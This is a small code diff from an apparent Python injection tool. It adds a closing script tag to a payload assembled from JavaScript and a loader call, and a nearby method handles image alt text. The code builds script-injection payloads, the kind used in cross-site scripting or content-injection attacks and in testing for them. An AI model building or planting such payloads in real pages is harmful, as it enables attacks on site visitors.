@@ -72,6 +72,7 @@ class Injector:
         payload += js
         payload += "}\n"
         payload += loader + "();"
+        payload += "</script>"
 
     def AltTextPayload(image_path):
         def GetAltText(image_path):
